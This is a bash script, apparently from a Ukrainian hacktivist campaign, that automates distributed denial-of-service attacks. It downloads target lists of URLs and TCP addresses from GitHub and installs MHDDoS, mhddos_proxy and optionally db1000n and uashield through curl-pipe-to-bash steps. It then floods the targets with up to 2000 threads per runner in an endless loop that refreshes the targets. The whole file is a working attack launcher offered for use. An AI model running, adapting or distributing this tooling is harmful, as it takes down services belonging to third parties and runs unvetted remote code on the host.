#!/bin/bash
# curl -L tiny.one/multiddos | bash && tmux a

clear
echo -e "Loading...\n"

sudo apt-get update -q -y #>/dev/null 2>&1
# sudo apt install docker.io gcc libc-dev libffi-dev libssl-dev python3-dev rustc -qq -y 
sudo apt-get install -q -y tmux toilet python3 python3-pip 
pip install --upgrade pip >/dev/null 2>&1

cd ~
rm -rf multidd
mkdir multidd
cd multidd

typing_on_screen (){
    tput setaf 2 &>/dev/null # green powaaa
    for ((i=0; i<=${#1}; i++)); do
        printf '%s' "${1:$i:1}"
        sleep 0.08$(( (RANDOM % 5) + 1 ))
    done
    tput sgr0 2 &>/dev/null
}
export -f typing_on_screen

gotop="on"
db1000n="off"
uashield="off"
vnstat="off"
matrix="off"
export methods="--http-methods GET STRESS"
#rpc="--rpc 2000"
#export debug="--debug"


### prepare target files (main and secondary)
prepare_targets_and_banner () {
all_targets="/var/tmp/all.uaripper.targets"
export main_targets="/var/tmp/main.uaripper.targets"
main_targets_tmp="/var/tmp/main_tmp.uaripper.targets"
export sec_targets="/var/tmp/secondary.uaripper.targets"
sec_targets_tmp="/var/tmp/secondary_tmp.uaripper.targets"

#remove previous copies
rm -f /var/tmp/*uaripper.targets

# read targets from github and put only uncommented lines in file $all_targets
echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets_parts)" | while read LINE; do
    if [[ $LINE != "#"* ]]; then
        echo $LINE >> $all_targets
    fi
done

# put every line except last line in file $sec_targets
head -n -2 $all_targets > $sec_targets

# put only last line in file $main_targets
tail -n 2 $all_targets > $main_targets

# put all addresses found in $sec_targets in a file on a new line
for i in $(cat $sec_targets); do
    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
        echo $i >> $sec_targets_tmp
    fi
done

# put all addresses found in $main_targets in a file on a new line
for i in $(cat $main_targets); do
    if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
        echo $i >> $main_targets_tmp
    fi
done

# Check and save only uniq targets
cat $sec_targets_tmp | sort | uniq > $sec_targets
cat $main_targets_tmp | sort | uniq > $main_targets

# Print greetings and number of targets (secondary, main, total)
clear
toilet -t --metal "Український" && sleep 0.1
toilet -t --metal "   жнець" && sleep 0.1
toilet -t --metal " MULTIDDOS" && sleep 0.1

typing_on_screen 'Шукаю завдання...'

sleep 1
echo -e "\n" && sleep 0.1
echo -e "Secondary targets:" "\x1b[32m $(cat $sec_targets | sort | uniq | wc -l)\x1b[m" && sleep 0.1
echo -e "Main targets:     " "\x1b[32m $(cat $main_targets | sort | uniq | wc -l)\x1b[m" && sleep 0.1
echo -e "Total:            " "\x1b[32m $(expr $(cat $sec_targets | sort | uniq | wc -l) + $(cat $main_targets | sort | uniq | wc -l))\x1b[m" && sleep 0.1

echo -e "\nКількість потоків:" "\x1b[32m $(echo $threads | cut -d " " -f2)\x1b[m" && sleep 0.1
echo -e "\nЗавантаження..."
sleep 5
}
export -f prepare_targets_and_banner

launch () {
if [ ! -f "/usr/local/bin/gotop" ]; then
    curl -L https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb -o gotop.deb
    sudo dpkg -i gotop.deb
fi

# kill previous sessions or processes in case they wasn't 
tmux kill-session -t multiddos > /dev/null 2>&1
sudo pkill node > /dev/null 2>&1
sudo pkill shield > /dev/null 2>&1
# tmux mouse support
grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
tmux source-file ~/.tmux.conf > /dev/null 2>&1


if [[ $gotop == "on" ]]; then
    tmux new-session -s multiddos -d 'gotop -asc solarized'
    sleep 0.2
    tmux split-window -h -p 66 'bash auto_bash.sh'
else 
    if [[ $matrix == "on" ]]; then
        tmux new-session -s multiddos -d 'cmatrix'
        sleep 0.2
        tmux split-window -h -p 66 'bash auto_bash.sh'
    else
        sleep 0.2
        tmux new-session -s multiddos -d 'bash auto_bash.sh'
    fi
fi

if [[ $vnstat == "on" ]]; then
sudo apt install vnstat
sleep 0.2
tmux split-window -v 'vnstat -l'
fi

if [[ $db1000n == "on" ]]; then
sudo apt -yq install torsocks
sleep 0.2
tmux split-window -v 'curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash && torsocks -i ./db1000n'
#tmux split-window -v 'docker run --rm -it --pull always ghcr.io/arriven/db1000n'
fi
if [[ $uashield == "on" ]]; then
sleep 0.2
tmux split-window -v 'curl -L https://github.com/opengs/uashield/releases/download/v1.0.3/shield-1.0.3.tar.gz -o shield.tar.gz && tar -xzf shield.tar.gz --strip 1 && ./shield'
fi
if [[ $matrix == "on" ]] && [[ $gotop == "on" ]]; then
sleep 0.2
tmux select-pane -t 0
sleep 0.2
tmux split-window -v 'cmatrix'
fi
#tmux -2 attach-session -d
}

usage () {
cat << EOF
usage: bash multiddos.sh [-d|-u|-t|-m|-h]
                            -d | --db1000n        - disable db1000n
                            -g | --gotop          - disable gotop
                            +u | --uashield       - enable uashield
                            -t | --threads        - threads; default = 1000
                            +m | --matrix         - enable matrix
                            +v | --vnstat         - enable vnstat -l (traffic monitoring)
                            -h | --help           - brings up this menu
EOF
exit
}

if [[ "$1" = ""  ]]; then launch; fi

while [ "$1" != "" ]; do
    case $1 in
        +d | --db1000n )   db1000n="on"; shift ;;
        +u | --uashield )   uashield="on"; shift ;;
        -t | --threads )   export threads="-t $2"; echo $threads; t_set_manual="on"; shift 2 ;;
        +m | --matrix )   matrix="on"; shift ;;
        -g | --gotop ) gotop="off"; db1000n="off"; shift ;;
        +v | --vnstat ) vnstat="on"; shift ;;
        -h | --help )    usage;   exit ;;
        *  )   usage;   exit ;;
    esac
done

#assign auto calculated threads value if it wasn't assidgned as -t in command line
#threads = number of cores * 250
if [[ $t_set_manual != "on" ]]; then 
    if [[ $(nproc --all) -le 8 ]]; then
        threads="-t $(expr $(nproc --all) "*" 250)"
    elif [[ $(nproc --all) -gt 8 ]]; then
        threads="-t 2000"
    else
        threads="-t 500" #safe value in case something go wrong
    fi
export threads
echo $threads
fi

prepare_targets_and_banner
clear

# create small separate script to re-launch only this part of code and not the whole thing
cat > auto_bash.sh << 'EOF'
# create swap file if system doesn't have it
if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
    sudo fallocate -l 1G /swapfile && sudo chmod 600 /swapfile && sudo mkswap /swapfile && sudo swapon /swapfile
fi

#install mhddos and mhddos_proxy
cd ~/multidd/
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
python3 -m pip install -r requirements.txt
git clone https://github.com/MHProDev/MHDDoS.git

# Restart attacks and update targets every 30 minutes
while true; do
echo "threads:"$threads
echo "methods:"$methods
sleep 2
        pkill -f start.py; pkill -f runner.py 
        python3 ~/multidd/mhddos_proxy/runner.py -c $main_targets $threads $methods&
        sleep 15 # to decrease load on cpu during simultaneous start
        python3 ~/multidd/mhddos_proxy/runner.py -c $sec_targets $threads $methods&
sleep 5m
prepare_targets_and_banner
clear
done
EOF

launch